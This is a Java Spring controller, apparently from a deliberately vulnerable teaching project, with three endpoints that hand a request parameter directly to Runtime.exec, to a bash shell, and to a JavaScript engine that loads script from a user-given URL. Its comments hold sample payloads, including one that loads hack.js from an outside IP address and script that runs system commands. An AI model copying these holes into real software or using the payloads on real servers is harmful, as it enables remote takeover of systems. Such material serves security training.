package com.ha0l.rceseccode.controller;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.script.*;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

@RestController
@RequestMapping("/rce")
public class RceController {

    /**
     * http://localhost:8791/rce/commondExecVuln?commond=whoami
     * http://localhost:8791/rce/commondExecVuln?commond=open%20-a%20Calculator
     * @param commond cmd
     */
    @GetMapping("/commondExecVuln")
    public String commondExecVuln(String commond) {
        Runtime runtime = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();
        try {
            Process process = runtime.exec(commond);
            BufferedInputStream inputStream = new BufferedInputStream(process.getInputStream());
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));

            String tmpStr;
            while ((tmpStr = reader.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (process.waitFor() != 0) {
                if (process.exitValue() == 1)
                    return "Command exec failed!!";
            }

            reader.close();
            inputStream.close();
        }catch (Exception e) {
            return e.toString();
        }
        return sb.toString();
    }

    /**
     * http://localhost:8791/rce/processBuilderVuln?commond=whoami
     * http://localhost:8791/rce/processBuilderVuln?commond=open%20-a%20Calculator
     * @param commond cmd
     */
    @GetMapping("/processBuilderVuln")
    public String processBuilderVuln(String commond) {
        StringBuilder sb = new StringBuilder();
        try {
            String[] arrCmd = {"/bin/bash", "-c", commond};
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process process = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(process.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));

            String tmpStr;
            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        }catch (Exception e) {
            return e.toString();
        }
        return sb.toString();
    }

    /**
     * http://localhost:8791/rce/jsEngineVuln?jsUrl=http://82.157.233.147:8000/hack.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsUrl js url
     */
    @GetMapping("/jsEngineVuln")
    public void jsEngineVuln(String jsUrl) throws ScriptException {
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        String cmd = String.format("load(\"%s\")", jsUrl);
        engine.eval(cmd, bindings);
    }
}
